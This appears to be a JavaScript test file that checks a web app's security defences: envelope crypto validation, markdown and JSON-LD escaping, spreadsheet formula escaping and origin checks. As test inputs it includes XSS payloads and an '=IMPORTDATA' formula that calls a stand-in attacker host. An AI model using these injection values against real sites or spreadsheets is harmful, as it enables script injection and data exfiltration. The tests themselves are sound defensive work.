import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import path from 'node:path';
import test from 'node:test';
import vm from 'node:vm';

import { isEnvelope, seal, unseal } from '../public/lib/schedule-crypto.js';
import { renderMarkdown } from '../public/lib/markdown.js';
import { safeJsonLd } from '../app/utils/safe-jsonld.js';

const root = path.resolve(import.meta.dirname, '..');

async function loadBackend() {
  const source = await readFile(path.join(root, 'apps-script/Code.gs'), 'utf8');
  const context = vm.createContext({
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput(text) {
        return { text, setMimeType() { return this; } };
      }
    }
  });
  new vm.Script(source, { filename: 'apps-script/Code.gs' }).runInContext(context);
  return context;
}

test('public schedule envelopes reject hostile KDF and binary metadata', async () => {
  const envelope = await seal({ events: [] }, 'a passphrase');
  assert.equal(isEnvelope(envelope), true);

  const raised = { ...envelope, iterations: envelope.iterations + 1 };
  assert.equal(isEnvelope(raised), false);
  await assert.rejects(() => unseal(raised, 'a passphrase'), /KDF parameters/i);

  const badSalt = { ...envelope, salt: envelope.salt.slice(0, -4) };
  assert.equal(isEnvelope(badSalt), false);
  await assert.rejects(() => unseal(badSalt, 'a passphrase'), /salt/i);

  const badCiphertext = { ...envelope, ct: 'A'.repeat(3 * 1024 * 1024) };
  assert.equal(isEnvelope(badCiphertext), false);
  await assert.rejects(() => unseal(badCiphertext, 'a passphrase'), /ciphertext/i);

  assert.equal(isEnvelope({ ...envelope, hint: 'x'.repeat(2001) }), false);
});

test('schedule sealing handles a large private payload without argument overflow', async () => {
  const value = { blob: 'x'.repeat(300_000) };
  const envelope = await seal(value, 'a passphrase');
  const opened = await unseal(envelope, 'a passphrase');
  assert.equal(opened.blob.length, value.blob.length);
});

test('markdown cross-reference resolvers can only create internal links', () => {
  const html = renderMarkdown('(demo.section.q1)', {
    resolveRef: () => ({ href: 'javascript:alert(1)', label: '<img src=x onerror=alert(1)>' })
  });
  assert.doesNotMatch(html, /javascript:|<img/i);
  assert.match(html, /\(demo\.section\.q1\)/);

  const safe = renderMarkdown('(demo.section.q1)', {
    resolveRef: () => ({ href: '/topics/demo#question-demo.section.q1', label: 'Demo question' })
  });
  assert.match(safe, /href="\/topics\/demo#question-demo\.section\.q1"/);
  assert.match(safe, />&#8594; Demo question<\/a>/);
});

test('JSON-LD cannot terminate its raw-text script element', () => {
  const serialized = safeJsonLd({ headline: '</script><script>alert(1)</script>', note: '& < >' });
  assert.doesNotMatch(serialized, /<\/?script/i);
  assert.ok(serialized.includes('\\u003c/script\\u003e'));
  assert.equal(JSON.parse(serialized).headline, '</script><script>alert(1)</script>');
});

test('Apps Script stores formula-looking user values as literal text', async () => {
  const backend = await loadBackend();
  for (const value of ['=IMPORTDATA("https://attacker.invalid")', '+1+1', '-1+1', '@SUM(A:A)', '  =1+1']) {
    assert.equal(backend.safeCellValue(value), `'${value}`);
  }
  assert.equal(backend.safeCellValue('ordinary note'), 'ordinary note');
  assert.equal(backend.safeCellValue(42), 42);
});

test('Apps Script rejects oversized public requests before authentication', async () => {
  const backend = await loadBackend();
  const output = backend.doPost({ postData: { contents: 'x'.repeat(1000001) } });
  const body = JSON.parse(output.text);
  assert.equal(body.ok, false);
  assert.match(body.error, /Request/);
});

test('Apps Script dispatch has no inherited action handlers', async () => {
  const backend = await loadBackend();
  assert.equal(backend.ACTIONS.constructor, undefined);
  assert.equal(backend.ACTIONS.toString, undefined);
});

test('course bridge keeps authenticated NTT responses on the published app origin', async () => {
  const source = await readFile(path.join(root, 'public/course-registration/app.js'), 'utf8');
  assert.ok(source.includes("target.origin !== 'https://gazll.github.io'"));
  assert.match(source, /MAX_RESPONSE_CHARS\s*=\s*2_000_000/);
  assert.match(source, /allowedPaths\.has\(message\.path\)/);
  assert.match(source, /event\.source !== popup/);
});
